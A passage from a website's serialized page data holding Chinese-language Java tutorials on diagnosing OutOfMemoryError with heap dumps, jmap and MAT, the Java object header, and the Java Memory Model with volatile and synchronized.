Roots的引用链。这样就能够找到泄漏的对象是通过怎么样的路径与GC Roots相关联的导致垃圾回收机制无法将其回收。掌握了泄漏对象的类信息和GC Roots引用链的信息，就可以比较准确地定位泄漏代码的位置。\n\n * 如果不存在泄漏，那么就是内存中的对象确实必须存活着，那么此时就需要通过虚拟机的堆参数（ -Xmx和-Xms）来适当调大参数；从代码上检查是否存在某些对象存活时间过长、持有时间过长的情况，尝试减少运行时内存的消耗。\n\n\n# 实战\n\n> 接下来用一个简单的案例，展示OOM问题排查过程\n\npublic class OomDemo {\n    public static void main(String[] args) {\n        StringBuilder stringBuilder = new StringBuilder();\n        while(true){\n            stringBuilder.append(System.currentTimeMillis());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * 执行代码时，通过设置JVM参数达到OOM的目的\n\njava -Xmx10m -Xms10m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=oom.hprof OomDemo\n\n\n1\n\n\n-XX:+HeapDumpOnOutOfMemoryError和-XX:HeapDumpPath参数分别用于指定发生OOM是否要导出堆以及导出堆的文件路径\n\n这个方法也可以通过jmap实时生成\n\njmap -dump:format=b,file=$java_pid.hprof     #java_pid为java进程ID \n\n\n1\n\n\n以上命令执行后，程序会出现如下错误：\n\njava.lang.OutOfMemoryError: Java heap space\nDumping heap to oom.out ...\nHeap dump file created [3196858 bytes in 0.016 secs]\nException in thread "main" java.lang.OutOfMemoryError: Java heap space\n        at java.util.Arrays.copyOf(Arrays.java:3332)\n        at java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:124)\n        at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:700)\n        at java.lang.StringBuilder.append(StringBuilder.java:214)\n        at jvm.OomDemo.main(OomDemo.java:13)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# MAT分析\n\n首先使用MAT打开刚刚导出的hprof文件，选择报告里的泄露嫌疑分析 Leak Suspects Report\n\n可以看到有一个本地变量，站了总存储的92%，实际占用的是char[]，See stacktrace，可看到该对象所在线程的堆栈信息：\n\n通过这儿，可以定位到发生OOM的代码段，至此，可根据具体代码具体分析。',normalizedContent:'# 什么是oom\n\noom为out of memory的简称，来源于java.lang.outofmemoryerror，指程序需要的内存空间大于系统分配的内存空间，oom后果就是程序crash；可以通俗理解：程序申请内存过大，虚拟机无法满足，然后自杀了。\n\n\n# 导致oom问题的原因\n\n为什么会没有内存了呢？原因不外乎有两点：\n\n1）分配的少了：比如虚拟机本身可使用的内存（一般通过启动时的vm参数指定）太少。\n\n2）应用用的太多，并且用完没释放，浪费了。此时就会造成内存泄露或者内存溢出。\n\n内存泄露：申请使用完的内存没有释放，导致虚拟机不能再次使用该内存，此时这段内存就泄露了，因为申请者不用了，而又不能被虚拟机分配给别人用。\n\n内存溢出：申请的内存超出了jvm能提供的内存大小，此时称之为溢出。\n\n最常见的oom情况有以下三种：\n\n * java.lang.outofmemoryerror: java heap space ------\x3ejava堆内存溢出，此种情况最常见，一般由于内存泄露或者堆的大小设置不当引起。对于内存泄露，需要通过内存监控软件查找程序中的泄露代码，而堆大小可以通过虚拟机参数-xms,-xmx等修改。\n * java.lang.outofmemoryerror: permgen space 或 java.lang.outofmemoryerror：metaspace ------\x3ejava方法区，（java8 元空间）溢出了，一般出现于大量class或者jsp页面，或者采用cglib等反射机制的情况，因为上述情况会产生大量的class信息存储于方法区。此种情况可以通过更改方法区的大小来解决，使用类似-xx:permsize=64m -xx:maxpermsize=256m的形式修改。另外，过多的常量尤其是字符串也会导致方法区溢出。\n * java.lang.stackoverflowerror ------\x3e 不会抛oom error，但也是比较常见的java内存溢出。java虚拟机栈溢出，一般是由于程序中存在死循环或者深度递归调用造成的，栈大小设置太小也会出现此种溢出。可以通过虚拟机参数-xss来设置栈的大小。\n\n\n# 排查手段\n\n一般手段是：先通过内存映像工具对dump出来的堆转储快照进行分析，重点是确认内存中的对象是否是必要的，也就是要先分清楚到底是出现了内存泄漏还是内存溢出。\n\n * 如果是内存泄漏，可进一步通过工具查看泄漏对象到gc roots的引用链。这样就能够找到泄漏的对象是通过怎么样的路径与gc roots相关联的导致垃圾回收机制无法将其回收。掌握了泄漏对象的类信息和gc roots引用链的信息，就可以比较准确地定位泄漏代码的位置。\n\n * 如果不存在泄漏，那么就是内存中的对象确实必须存活着，那么此时就需要通过虚拟机的堆参数（ -xmx和-xms）来适当调大参数；从代码上检查是否存在某些对象存活时间过长、持有时间过长的情况，尝试减少运行时内存的消耗。\n\n\n# 实战\n\n> 接下来用一个简单的案例，展示oom问题排查过程\n\npublic class oomdemo {\n    public static void main(string[] args) {\n        stringbuilder stringbuilder = new stringbuilder();\n        while(true){\n            stringbuilder.append(system.currenttimemillis());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * 执行代码时，通过设置jvm参数达到oom的目的\n\njava -xmx10m -xms10m -xx:+heapdumponoutofmemoryerror -xx:heapdumppath=oom.hprof oomdemo\n\n\n1\n\n\n-xx:+heapdumponoutofmemoryerror和-xx:heapdumppath参数分别用于指定发生oom是否要导出堆以及导出堆的文件路径\n\n这个方法也可以通过jmap实时生成\n\njmap -dump:format=b,file=$java_pid.hprof     #java_pid为java进程id \n\n\n1\n\n\n以上命令执行后，程序会出现如下错误：\n\njava.lang.outofmemoryerror: java heap space\ndumping heap to oom.out ...\nheap dump file created [3196858 bytes in 0.016 secs]\nexception in thread "main" java.lang.outofmemoryerror: java heap space\n        at java.util.arrays.copyof(arrays.java:3332)\n        at java.lang.abstractstringbuilder.ensurecapacityinternal(abstractstringbuilder.java:124)\n        at java.lang.abstractstringbuilder.append(abstractstringbuilder.java:700)\n        at java.lang.stringbuilder.append(stringbuilder.java:214)\n        at jvm.oomdemo.main(oomdemo.java:13)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# mat分析\n\n首先使用mat打开刚刚导出的hprof文件，选择报告里的泄露嫌疑分析 leak suspects report\n\n可以看到有一个本地变量，站了总存储的92%，实际占用的是char[]，see stacktrace，可看到该对象所在线程的堆栈信息：\n\n通过这儿，可以定位到发生oom的代码段，至此，可根据具体代码具体分析。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java对象头",frontmatter:{title:"java对象头",date:"2022-04-17T23:21:45.000Z",permalink:"/pages/bff2a8/",categories:["java","jvm"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/08.java%E5%AF%B9%E8%B1%A1%E5%A4%B4.html",relativePath:"04.java/05.jvm/08.java对象头.md",key:"v-33929422",path:"/pages/bff2a8/",headersStr:null,content:"如果是对象为2个字宽,数组为3个字宽\n\nJava对象头里的Mark Word里默认存储对象的HashCode、分代年龄和锁标记位。32位JVM的Mark Word的默认存储结构 在运行期间，Mark Word里存储的数据会随着锁标志位的变化而变化。Mark Word可能变化为存储以下4种数据\n\nMark Word是64bit大小的，其存储结构",normalizedContent:"如果是对象为2个字宽,数组为3个字宽\n\njava对象头里的mark word里默认存储对象的hashcode、分代年龄和锁标记位。32位jvm的mark word的默认存储结构 在运行期间，mark word里存储的数据会随着锁标志位的变化而变化。mark word可能变化为存储以下4种数据\n\nmark word是64bit大小的，其存储结构",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Java内存模型(JMM)",frontmatter:{title:"Java内存模型(JMM)",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/1b51c8/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/09.Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B(JMM).html",relativePath:"04.java/05.jvm/09.Java内存模型(JMM).md",key:"v-4b186889",path:"/pages/1b51c8/",headers:[{level:2,title:"1、 计算机的硬件内存结构",slug:"_1、-计算机的硬件内存结构",normalizedTitle:"1、 计算机的硬件内存结构",charIndex:3},{level:2,title:"2、 Java 内存模型的背景和定义",slug:"_2、-java-内存模型的背景和定义",normalizedTitle:"2、 java 内存模型的背景和定义",charIndex:21},{level:2,title:"3、 Java 内存模型",slug:"_3、-java-内存模型",normalizedTitle:"3、 java 内存模型",charIndex:44},{level:3,title:"3.1 主内存、工作内存的定义",slug:"_3-1-主内存、工作内存的定义",normalizedTitle:"3.1 主内存、工作内存的定义",charIndex:57},{level:3,title:"3.2 内存的交互操作",slug:"_3-2-内存的交互操作",normalizedTitle:"3.2 内存的交互操作",charIndex:73},{level:3,title:"3.3 JMM 缓存不一致问题",slug:"_3-3-jmm-缓存不一致问题",normalizedTitle:"3.3 jmm 缓存不一致问题",charIndex:85},{level:2,title:"4、 Java 内存模型的实现",slug:"_4、-java-内存模型的实现",normalizedTitle:"4、 java 内存模型的实现",charIndex:105}],headersStr:"1、 计算机的硬件内存结构 2、 Java 内存模型的背景和定义 3、 Java 内存模型 3.1 主内存、工作内存的定义 3.2 内存的交互操作 3.3 JMM 缓存不一致问题 4、 Java 内存模型的实现",content:" * 1、 计算机的硬件内存结构\n\n * 2、 Java 内存模型的背景和定义\n\n * 3、 Java 内存模型 3.1 主内存、工作内存的定义 3.2 内存的交互操作 3.3 JMM 缓存不一致问题\n\n * 4、 Java 内存模型的实现\n\n在学习 Java 内存模型(JMM)前，我们先了解下计算机的硬件内存结构，因为 JMM 结构就是基于此演变而来的。\n\n\n# 1、 计算机的硬件内存结构\n\n在单核计算机中，计算机中的 CPU 计算速度是非常快的，但是与计算机中的其它硬件(如 IO、内存等)同 CPU 的速度比起来是相差甚远的，所以协调 CPU 和各个硬件之间的速度差异是非常重要的，要不然 CPU 就一直在等待，浪费资源。单核尚且如此，在多核中，这样的问题会更加的突出。硬件结构如下图所示：\n\n我们先大概梳理下这个流程：当我们的计算机要执行某个任务或者计算某个数字时，主内存会首先从数据库中加载计算机计算所需要的数据，因为内存和 CPU 的速度相差较大，所以有必要在内存和 CPU 间引入缓存(根据实际的需要，可以引入多层缓存)，主内存中的数据会先存放在 CPU 缓存中，当这些数据需要同 CPU 做交互时会加入到 CPU 寄存器中，最后被 CPU 使用。\n\n事实上，在单核情况下，基于缓存的交互可以很好的解决 CPU 与其它硬件之间的速度匹配，但是在多核情况下，各个处理器都要遵循一定的协议来保障内存中的各个处理器的缓存和主内存中的数据一致性问题，这类协议通常被称为缓存一致性协议。\n\n\n\n\n# 2、 Java 内存模型的背景和定义\n\n我们在开发时会经常遇到这样的场景，我们开发完成的代码在我们自己的运行环境上表现良好，但是当我们把它放在其它硬件平台上时，就会出现各种各样的错误，这是因为在不同的硬件生产商和不同的操作系统下，内存的访问逻辑有一定的差异，结果就是当你的代码在某个系统环境下运行良好，并且线程安全，但是换了个系统就出现各种问题。\n\n为了解决这个问题，Java 内存模型(JMM)的概念就被提出来了，它的出现可以屏蔽系统和硬件的差异，让一套代码在不同平台下能到达相同的访问结果，实现平台的一致性，使得 Java 程序能够一次编写，到处运行。\n\n这样的描述的好像有点熟悉啊，这不是 JVM 的概念描述么，它们两者有什么区别啊?\n\nJVM 与 JMM 间的区别？\n\n实际上，JMM 是 Java 虚拟机(JVM)在计算机内存(RAM)中的工作方式，JMM 定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（Main Memory）中，每个线程都有一个私有的本地内存（Local Memory），本地内存中存储了该线程以读/写共享变量的副本，本地内存是 JMM 的一个抽象概念，并不真实存在。它涵盖了缓存、写缓冲区、寄存器以及其他的硬件和编译器优化。而 JVM 则是描述的是 Java 虚拟机内部及各个结构间的关系。\n\n小伙伴这时可能会有疑问，既然 JMM 是定义线程和主内存之间的关系，那么它的出现是不是解决并发领域的问题啊？没错，我们先回顾一下并发领域中的关键问题。\n\n并发领域中的关键问题？\n\n * 线程之间的通信\n\n在编程中，线程之间的通信机制有两种，共享内存和消息传递。\n\n> 在共享内存的并发模型里，线程之间共享程序的公共状态，线程之间通过写-读内存中的公共状态来隐式进行通信，典型的共享内存通信方式就是通过共享对象进行通信。\n> \n> 消息传递的并发模型里，线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信，在 java 中典型的消息传递方式就是 wait()和 notify()。\n\n * 线程间的同步\n\n> 同步是指程序用于控制不同线程之间操作发生相对顺序的机制。在共享内存并发模型里，同步是显式进行的。程序员必须显式指定某个方法或某段代码需要在线程之间互斥执行。在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。\n\n事实上，Java 内存模型(JMM)的并发采用的是共享内存模型。\n\n下面，我们一起来学习 Java 内存模型\n\n\n# 3、 Java 内存模型\n\n我们先看一张 JMM 的控制模型作图\n\n由此可见，Java 内存模型(JMM)同 CPU 缓存模型结构类似，是基于 CPU 缓存模型来建立的。\n\n我们先梳理一下 JMM 的工作流程，以上图为例，我们假设有一台四核的计算机，cpu1 操作线程 A，cpu2 操作线程 B，cpu3 操作线程 C，当这三个线程都需要对主内存中的共享变量进行操作时，这三条线程分别会将主内存中的共享内存读入自己的工作内存，自己保存一份共享变量的副本供自己线程本身使用。\n\n这时有的小伙伴可能会有以下疑问：\n\n * 主内存、工作内存的定义是什么？\n\n * 如何将主内存中的共享变量读入自己线程本身的工作内存?\n\n * 当其中的某一条线程修改了共享变量后，其余线程中的共享变量值是否变化，如果变化，线程间是怎么保持可见性的？\n\n下面，我们针对这两个疑问一一解答。\n\n\n# 3.1 主内存、工作内存的定义\n\n * 主内存\n\n> 主内存主要存储的是 Java 实例对象，即所有线程创建的实例对象都存放在主内存中，不管该实例对象是成员变量还是方法中的本地变量(也称局部变量)，当然也包括了共享的类信息、常量、静态变量。由于是共享数据区域，多条线程对同一个变量进行访问可能会发现线程安全问题。\n\n * 工作内存\n\n> 工作内存主要存储当前方法的所有本地变量信息(工作内存中存储着主内存中的变量副本拷贝)，即每个线程只能访问自己的工作内存，即线程中的本地变量对其它线程是不可见的，就算是两个线程执行的是同一段代码，它们也会各自在自己的工作内存中创建属于当前线程的本地变量，当然也包括了字节码行号指示器、相关 Native 方法的信息。注意由于工作内存是每个线程的私有数据，线程间无法相互访问工作内存，因此存储在工作内存的数据不存在线程安全问题。\n\nNOTE:这里的主内存、工作内存与 Java 内存区域中的 Java 堆、栈、方法区不是同一层次的内存划分，这两者基本上没有关系。\n\n搞清楚主内存和工作内存后，下一步就需要学习主内存与工作内存的数据交互操作的方式。\n\n\n# 3.2 内存的交互操作\n\n主内存与工作内存的交互操作有 8 种，虚拟机必须保证每一个操作都是原子的，这八种操作分别是：\n\n * Lock(锁定)\n\n> 作用于主内存的变量，把一个变量标识为一条线程独占状态。\n\n * unlock(解锁)\n\n> 作用于主内存的变量，它把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定\n\n * read(读取)\n\n> 作用于主内存变量，它把一个变量的值从主内存传输到线程的工作内存中，以便随后的 load 动作使用\n\n * load(载入)\n\n> 作用于工作内存的变量，它把 read 操作从主存中变量放入工作内存中\n\n * use(使用)\n\n> 作用于工作内存中的变量，它把工作内存中的变量传输给执行引擎，每当虚拟机遇到一个需要使用到变量的值，就会使用到这个指令\n\n * assign(赋值)\n\n> 作用于工作内存中的变量，它把一个从执行引擎中接受到的值放入工作内存的变量副本中\n\n * store(存储)\n\n> 作用于工作内存中的变量，它把一个从工作内存中一个变量的值传送到主内存中，以便后续的 write 使用\n\n * write(写入)\n\n> 作用于主内存中的变量，它把 store 操作从工作内存中得到的变量的值放入主内存的变量中\n\n单看这八种类型的原子操作可能有点抽象，我们画一个操作流程图仔细梳理下。\n\n操作流程图：\n\n从图中可以看出，如果要把一个变量从内存中复制到工作内存中，就需要顺序的执行 read 和 load 操作，如果把变量从工作内存同步到主内存中，就需要执行 store 和 write 操作。\n\nNOTE: Java 内存模型只要求上述操作必须按顺序执行，却没要求是连续执行。\n\n我们以两个线程为例梳理下操作流程：\n\n> 假设存在两个线程 A 和 B，如果线程 A 要与线程 B 要通信的话，首先，线程 A 把本地内存 A 中更新过的共享变量刷新到主内存中去；然后，线程 B 到主内存中读取线程 A 之前已经更新过的共享变量。\n\n敏锐的小伙伴可能会发现，如果多个线程同时读取修改同一个共享变量，这种情况可能会导致每个线程中的本地内存中缓存变量一致的问题，这个时候该怎么解决呢？\n\n\n# 3.3 JMM 缓存不一致问题\n\n解决 JMM 中的本地内存变量的缓存不一致问题有两种解决方案，分别是总线加锁和MESI缓存一致性协议。\n\n总线加锁\n\n总线加锁是 CPU 从主内存读取数据到本地内存时，会先在总线对这个数据加锁，这样其它 CPU 就没法去读或者去写这个数据，直到这个 CPU 使用完数据释放锁后，，其它的 CPU 才能读取该数据。\n\n总线加锁虽然能保证数据一致，但是它却严重降低了系统性能，因为当一个线程多总线加锁后，其它线程都只能等待，将原有的并行操作转成了串行操作。\n\n通常情况下，我们不采用这种方法，而是使用性能较高的缓存一致性协议。\n\nMESI 缓存一致性协议\n\n> MESI 缓存一致性协议是多个 CPU 从主内存读取同一个数据到各自的高速缓存中，当其中的某个 CPU 修改了缓存里的数据，该数据会马上同步回主内存，其它 CPU 通过总线嗅探机制可以感知到数据的变化从而将自己缓存里的数据失效。\n\n在并发编程中，如果多个线程对同一个共享变量进行操作是，我们通常会在变量名称前加上关键在volatile,因为它可以保证线程对变量的修改的可见性，保证可见性的基础是多个线程都会监听总线。即当一个线程修改了共享变量后，该变量会立马同步到主内存，其余线程监听到数据变化后会使得自己缓存的原数据失效，并触发read操作读取新修改的变量的值。进而保证了多个线程的数据一致性。事实上，volatile的工作原理就是依赖于 MESI 缓存一致性协议实现的。\n\n\n# 4、 Java 内存模型的实现\n\n在 Java 多线程中，Java 提供了一系列与并发处理相关的关键字，比如volatile、synchronized、final、concurren包等。其实这些就是 Java 内存模型封装了底层的实现后提供给程序员使用的一些关键字\n\n事实上，Java 内存模型的本质是围绕着 Java 并发过程中的如何处理原子性、可见性和顺序性这三个特征来设计的，这三大特性可以直接使用 Java 中提供的关键字实现，它们也是面试中经常被问到的题目。\n\n * 原子性\n\n> 原子性的定义是一个操作不能被打断，要么全部执行完毕，要么不执行。在这点上有点类似于事务操作，要么全部执行成功，要么回退到执行该操作之前的状态。\n\nJMM 保证的原子性变量操作包括 read、load、assign、use、store、write\n\nNOTE:基本类型数据的访问大都是原子操作，long 和 double 类型的变量是 64 位，但是在 32 位 JVM 中，32 位的 JVM 会将 64 位数据的读写操作分为 2 次 32 位的读写操作来进行，这就导致了 long、double 类型的变量在 32 位虚拟机中是非原子操作，数据有可能会被破坏，也就意味着多个线程在并发访问的时候是线程非安全的。\n\n对于非原子操作的基本类型，可以使用 synchronized 来保证方法和代码块内的操作是原子性的。\n\n`synchronized (this) {` `a=1;` `b=2;``}`\n\n\n1\n\n\n复制代码\n\n如一个线程观察另外一个线程执行上面的代码，只能看到 a、b 都被赋值成功结果，或者 a、b 都尚未被赋值的结果。\n\n * 可见性\n\nJava 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值的这种依赖主内存作为传递媒介的方式来实现的。\n\nJava 中的 volatile 关键字提供了一个功能，那就是被其修饰的变量在被修改后可以立即同步到主内存，被其修饰的变量在每次是用之前都从主内存刷新。因此，可以使用 volatile 来保证多线程操作时变量的可见性。\n\n除了 volatile，Java 中的 synchronized 和 final 两个关键字也可以实现可见性。只不过实现方式不同，这里不再展开了。\n\n * 有序性\n\n在 Java 中，可以使用 synchronized 和 volatile 来保证多线程之间操作的有序性。实现方式有所区别：\n\n> volatile 关键字会禁止指令重排。synchronized 关键字保证同一时刻只允许一条线程操作。\n\n好了，这里简单的介绍完了 Java 并发编程中解决原子性、可见性以及有序性可以使用的关键字。读者可能发现了，好像 synchronized 关键字是万 能的，他可以同时满足以上三种特性，这其实也是很多人滥用 synchronized 的原因。\n\n但是 synchronized 是比较影响性能的，虽然编译器提供了很多锁优化技术，但是也不建议过度使用。",normalizedContent:" * 1、 计算机的硬件内存结构\n\n * 2、 java 内存模型的背景和定义\n\n * 3、 java 内存模型 3.1 主内存、工作内存的定义 3.2 内存的交互操作 3.3 jmm 缓存不一致问题\n\n * 4、 java 内存模型的实现\n\n在学习 java 内存模型(jmm)前，我们先了解下计算机的硬件内存结构，因为 jmm 结构就是基于此演变而来的。\n\n\n# 1、 计算机的硬件内存结构\n\n在单核计算机中，计算机中的 cpu 计算速度是非常快的，但是与计算机中的其它硬件(如 io、内存等)同 cpu 的速度比起来是相差甚远的，所以协调 cpu 和各个硬件之间的速度差异是非常重要的，要不然 cpu 就一直在等待，浪费资源。单核尚且如此，在多核中，这样的问题会更加的突出。硬件结构如下图所示：\n\n我们先大概梳理下这个流程：当我们的计算机要执行某个任务或者计算某个数字时，主内存会首先从数据库中加载计算机计算所需要的数据，因为内存和 cpu 的速度相差较大，所以有必要在内存和 cpu 间引入缓存(根据实际的需要，可以引入多层缓存)，主内存中的数据会先存放在 cpu 缓存中，当这些数据需要同 cpu 做交互时会加入到 cpu 寄存器中，最后被 cpu 使用。\n\n事实上，在单核情况下，基于缓存的交互可以很好的解决 cpu 与其它硬件之间的速度匹配，但是在多核情况下，各个处理器都要遵循一定的协议来保障内存中的各个处理器的缓存和主内存中的数据一致性问题，这类协议通常被称为缓存一致性协议。\n\n\n\n\n# 2、 java 内存模型的背景和定义\n\n我们在开发时会经常遇到这样的场景，我们开发完成的代码在我们自己的运行环境上表现良好，但是当我们把它放在其它硬件平台上时，就会出现各种各样的错误，这是因为在不同的硬件生产商和不同的操作系统下，内存的访问逻辑有一定的差异，结果就是当你的代码在某个系统环境下运行良好，并且线程安全，但是换了个系统就出现各种问题。\n\n为了解决这个问题，java 内存模型(jmm)的概念就被提出来了，它的出现可以屏蔽系统和硬件的差异，让一套代码在不同平台下能到达相同的访问结果，实现平台的一致性，使得 java 程序能够一次编写，到处运行。\n\n这样的描述的好像有点熟悉啊，这不是 jvm 的概念描述么，它们两者有什么区别啊?\n\njvm 与 jmm 间的区别？\n\n实际上，jmm 是 java 虚拟机(jvm)在计算机内存(ram)中的工作方式，jmm 定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读/写共享变量的副本，本地内存是 jmm 的一个抽象概念，并不真实存在。它涵盖了缓存、写缓冲区、寄存器以及其他的硬件和编译器优化。而 jvm 则是描述的是 java 虚拟机内部及各个结构间的关系。\n\n小伙伴这时可能会有疑问，既然 jmm 是定义线程和主内存之间的关系，那么它的出现是不是解决并发领域的问题啊？没错，我们先回顾一下并发领域中的关键问题。\n\n并发领域中的关键问题？\n\n * 线程之间的通信\n\n在编程中，线程之间的通信机制有两种，共享内存和消息传递。\n\n> 在共享内存的并发模型里，线程之间共享程序的公共状态，线程之间通过写-读内存中的公共状态来隐式进行通信，典型的共享内存通信方式就是通过共享对象进行通信。\n> \n> 消息传递的并发模型里，线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信，在 java 中典型的消息传递方式就是 wait()和 notify()。\n\n * 线程间的同步\n\n> 同步是指程序用于控制不同线程之间操作发生相对顺序的机制。在共享内存并发模型里，同步是显式进行的。程序员必须显式指定某个方法或某段代码需要在线程之间互斥执行。在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。\n\n事实上，java 内存模型(jmm)的并发采用的是共享内存模型。\n\n下面，我们一起来学习 java 内存模型\n\n\n# 3、 java 内存模型\n\n我们先看一张 jmm 的控制模型作图\n\n由此可见，java 内存模型(jmm)同 cpu 缓存模型结构类似，是基于 cpu 缓存模型来建立的。\n\n我们先梳理一下 jmm 的工作流程，以上图为例，我们假设有一台四核的计算机，cpu1 操作线程 a，cpu2 操作线程 b，cpu3 操作线程 c，当这三个线程都需要对主内存中的共享变量进行操作时，这三条线程分别会将主内存中的共享内存读入自己的工作内存，自己保存一份共享变量的副本供自己线程本身使用。\n\n这时有的小伙伴可能会有以下疑问：\n\n * 主内存、工作内存的定义是什么？\n\n * 如何将主内存中的共享变量读入自己线程本身的工作内存?\n\n * 当其中的某一条线程修改了共享变量后，其余线程中的共享变量值是否变化，如果变化，线程间是怎么保持可见性的？\n\n下面，我们针对这两个疑问一一解答。\n\n\n# 3.1 主内存、工作内存的定义\n\n * 主内存\n\n> 主内存主要存储的是 java 实例对象，即所有线程创建的实例对象都存放在主内存中，不管该实例对象是成员变量还是方法中的本地变量(也称局部变量)，当然也包括了共享的类信息、常量、静态变量。由于是共享数据区域，多条线程对同一个变量进行访问可能会发现线程安全问题。\n\n * 工作内存\n\n> 工作内存主要存储当前方法的所有本地变量信息(工作内存中存储着主内存中的变量副本拷贝)，即每个线程只能访问自己的工作内存，即线程中的本地变量对其它线程是不可见的，就算是两个线程执行的是同一段代码，它们也会各自在自己的工作内存中创建属于当前线程的本地变量，当然也包括了字节码行号指示器、相关 native 方法的信息。注意由于工作内存是每个线程的私有数据，线程间无法相互访问工作内存，因此存储在工作内存的数据不存在线程安全问题。\n\nnote:这里的主内存、工作内存与 java 内存区域中的 java 堆、栈、方法区不是同一层次的内存划分，这两者基本上没有关系。\n\n搞清楚主内存和工作内存后，下一步就需要学习主内存与工作内存的数据交互操作的方式。\n\n\n# 3.2 内存的交互操作\n\n主内存与工作内存的交互操作有 8 种，虚拟机必须保证每一个操作都是原子的，这八种操作分别是：\n\n * lock(锁定)\n\n> 作用于主内存的变量，把一个变量标识为一条线程独占状态。\n\n * unlock(解锁)\n\n> 作用于主内存的变量，它把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定\n\n * read(读取)\n\n> 作用于主内存变量，它把一个变量的值从主内存传输到线程的工作内存中，以便随后的 load 动作使用\n\n * load(载入)\n\n> 作用于工作内存的变量，它把 read 操作从主存中变量放入工作内存中\n\n * use(使用)\n\n> 作用于工作内存中的变量，它把工作内存中的变量传输给执行引擎，每当虚拟机遇到一个需要使用到变量的值，就会使用到这个指令\n\n * assign(赋值)\n\n> 作用于工作内存中的变量，它把一个从执行引擎中接受到的值放入工作内存的变量副本中\n\n * store(存储)\n\n> 作用于工作内存中的变量，它把一个从工作内存中一个变量的值传送到主内存中，以便后续的 write 使用\n\n * write(写入)\n\n> 作用于主内存中的变量，它把 store 操作从工作内存中得到的变量的值放入主内存的变量中\n\n单看这八种类型的原子操作可能有点抽象，我们画一个操作流程图仔细梳理下。\n\n操作流程图：\n\n从图中可以看出，如果要把一个变量从内存中复制到工作内存中，就需要顺序的执行 read 和 load 操作，如果把变量从工作内存同步到主内存中，就需要执行 store 和 write 操作。\n\nnote: java 内存模型只要求上述操作必须按顺序执行，却没要求是连续执行。\n\n我们以两个线程为例梳理下操作流程：\n\n> 假设存在两个线程 a 和 b，如果线程 a 要与线程 b 要通信的话，首先，线程 a 把本地内存 a 中更新过的共享变量刷新到主内存中去；然后，线程 b 到主内存中读取线程 a 之前已经更新过的共享变量。\n\n敏锐的小伙伴可能会发现，如果多个线程同时读取修改同一个共享变量，这种情况可能会导致每个线程中的本地内存中缓存变量一致的问题，这个时候该怎么解决呢？\n\n\n# 3.3 jmm 缓存不一致问题\n\n解决 jmm 中的本地内存变量的缓存不一致问题有两种解决方案，分别是总线加锁和mesi缓存一致性协议。\n\n总线加锁\n\n总线加锁是 cpu 从主内存读取数据到本地内存时，会先在总线对这个数据加锁，这样其它 cpu 就没法去读或者去写这个数据，直到这个 cpu 使用完数据释放锁后，，其它的 cpu 才能读取该数据。\n\n总线加锁虽然能保证数据一致，但是它却严重降低了系统性能，因为当一个线程多总线加锁后，其它线程都只能等待，将原有的并行操作转成了串行操作。\n\n通常情况下，我们不采用这种方法，而是使用性能较高的缓存一致性协议。\n\nmesi 缓存一致性协议\n\n> mesi 缓存一致性协议是多个 cpu 从主内存读取同一个数据到各自的高速缓存中，当其中的某个 cpu 修改了缓存里的数据，该数据会马上同步回主内存，其它 cpu 通过总线嗅探机制可以感知到数据的变化从而将自己缓存里的数据失效。\n\n在并发编程中，如果多个线程对同一个共享变量进行操作是，我们通常会在变量名称前加上关键在volatile,因为它可以保证线程对变量的修改的可见性，保证可见性的基础是多个线程都会监听总线。即当一个线程修改了共享变量后，该变量会立马同步到主内存，其余线程监听到数据变化后会使得自己缓存的原数据失效，并触发read操作读取新修改的变量的值。进而保证了多个线程的数据一致性。事实上，volatile的工作原理就是依赖于 mesi 缓存一致性协议实现的。\n\n\n# 4、 java 内存模型的实现\n\n在 java 多线程中，java 提供了一系列与并发处理相关的关键字，比如volatile、synchronized、final、concurren包等。其实这些就是 java 内存模型封装了底层的实现后提供给程序员使用的一些关键字\n\n事实上，java 内存模型的本质是围绕着 java 并发过程中的如何处理原子性、可见性和顺序性这三个特征来设计的，这三大特性可以直接使用 java 中提供的关键字实现，它们也是面试中经常被问到的题目。\n\n * 原子性\n\n> 原子性的定义是一个操作不能被打断，要么全部执行完毕，要么不执行。在这点上有点类似于事务操作，要么全部执行成功，要么回退到执行该操作之前的状态。\n\njmm 保证的原子性变量操作包括 read、load、assign、use、store、write\n\nnote:基本类型数据的访问大都是原子操作，long 和 double 类型的变量是 64 位，但是在 32 位 jvm 中，32 位的 jvm 会将 64 位数据的读写操作分为 2 次 32 位的读写操作来进行，这就导致了 long、double 类型的变量在 32 位虚拟机中是非原子操作，数据有可能会被破坏，也就意味着多个线程在并发访问的时候是线程非安全的。\n\n对于非原子操作的基本类型，可以使用 synchronized 来保证方法和代码块内的操作是原子性的。\n\n`synchronized (this) {` `a=1;` `b=2;``}`\n\n\n1\n\n\n复制代码\n\n如一个线程观察另外一个线程执行上面的代码，只能看到 a、b 都被赋值成功结果，或者 a、b 都尚未被赋值的结果。\n\n * 可见性\n\njava 